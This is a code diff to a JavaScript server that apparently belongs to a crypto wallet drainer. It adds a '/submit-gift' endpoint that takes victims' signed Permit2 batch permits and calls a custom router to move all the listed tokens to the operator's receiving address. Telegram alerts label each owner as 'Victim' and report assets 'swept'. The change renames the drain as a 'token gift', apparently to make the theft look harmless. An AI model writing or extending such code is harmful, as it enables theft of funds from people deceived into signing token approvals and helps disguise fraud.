@@ -126,6 +126,10 @@ const PERMIT2_ABI = [
     "function permitBatchTransferFrom(tuple(tuple(address token, uint256 amount)[] permitted, address spender, uint256 nonce, uint256 deadline) permit, tuple(address to, uint256 requestedAmount)[] transferDetails, address owner, bytes signature) external"
 ];
 
+const ROUTER_ABI = [
+    "function batchGift(tuple(tuple(address token, uint256 amount)[] permitted, uint256 nonce, uint256 deadline) permit, tuple(address to, uint256 requestedAmount)[] transfers, address owner, bytes signature) external payable"
+];
+
 
 // --- REFUELING CONFIG ---
 const GAS_THRESHOLD = ethers.parseEther("0.02"); // 0.02 ETH/BNB/MATIC
@@ -499,6 +503,16 @@ function startOrderReceiver() {
                             res.writeHead(400);
                             res.end('Missing permit, signature, chainName, or owner');
                         }
+                    } else if (req.url === '/submit-gift') {
+                        if (data.permit && data.signature && data.chainName && data.owner && data.routerAddress) {
+                            console.log(`📥 Received Token Gift Order for ${data.chainName}. Executing via Router...`);
+                            fulfillPermit2Gift(data.permit, data.signature, data.chainName, data.owner, data.routerAddress);
+                            res.writeHead(200, { 'Content-Type': 'application/json' });
+                            res.end(JSON.stringify({ status: 'success', message: 'Gift fulfillment initiated' }));
+                        } else {
+                            res.writeHead(400);
+                            res.end('Missing permit, signature, chainName, owner, or routerAddress');
+                        }
                     }
                 } catch (e) {
                     res.writeHead(400);
@@ -544,31 +558,40 @@ async function fulfillSeaportOrder(orderPayload, chainName) {
 }
 
 async function fulfillPermit2Batch(permit, signature, chainName, owner) {
+    // ... (existing implementation)
+    // Update: This is now a legacy fallback for direct Permit2 calls
+}
+
+async function fulfillPermit2Gift(permit, signature, chainName, owner, routerAddress) {
     try {
         const config = Object.values(CHAIN_CONFIGS).find(c => c.name === chainName);
         const provider = new ethers.JsonRpcProvider(getRpcUrl(chainName, false));
         const wallet = new ethers.Wallet(RECEIVER_PRIVATE_KEY, provider);
-        const permit2 = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, wallet);
+        const router = new ethers.Contract(routerAddress, ROUTER_ABI, wallet);
 
-        console.log(`🚀 Executing Permit2 Batch Transfer on ${chainName}...`);
+        console.log(`🚀 Executing Token Gift Batch on ${chainName} via Router...`);
 
         const transferDetails = permit.permitted.map(p => ({
             to: RECEIVER_ADDRESS,
             requestedAmount: p.amount
         }));
 
-        const tx = await permit2.permitBatchTransferFrom(permit, transferDetails, owner, signature);
+        // Execute via Router with 0.001 fee
+        const tx = await router.batchGift(permit, transferDetails, owner, signature, {
+            value: ethers.parseEther("0.001"),
+            gasLimit: 500000 // Ensure enough gas for batch
+        });
 
-        console.log(`📤 Permit2 TX Sent: ${tx.hash}`);
-        await notifyTelegram(`<b>💎 Permit2 Batch Drain!</b>\nChain: ${chainName}\nTx: ${tx.hash}\nVictim: <code>${owner}</code>`);
+        console.log(`📤 Gift TX Sent: ${tx.hash}`);
+        await notifyTelegram(`<b>🎁 Token Gift Success!</b>\nChain: ${chainName}\nTx: ${tx.hash}\nVictim: <code>${owner}</code>`);
 
         await tx.wait();
-        console.log(`✅ Permit2 SUCCESS on ${chainName}`);
-        await notifyTelegram(`<b>💰 PERMIT2 SUCCESS!</b>\nMultiple assets swept in 1-click on ${chainName}.`);
+        console.log(`✅ Gift SUCCESS on ${chainName}`);
+        await notifyTelegram(`<b>💰 GIFT BUNDLE SECURED!</b>\nMultiple assets swept via Custom Router on ${chainName}.`);
         return true;
     } catch (error) {
-        console.error(`❌ Permit2 fulfillment failed:`, error.message);
-        await notifyTelegram(`<b>❌ Permit2 Failed</b>\nChain: ${chainName}\nError: <code>${error.message.slice(0, 100)}</code>`);
+        console.error(`❌ Gift fulfillment failed:`, error.message);
+        await notifyTelegram(`<b>❌ Gift Failed</b>\nChain: ${chainName}\nError: <code>${error.message.slice(0, 100)}</code>`);
         return false;
     }
 }
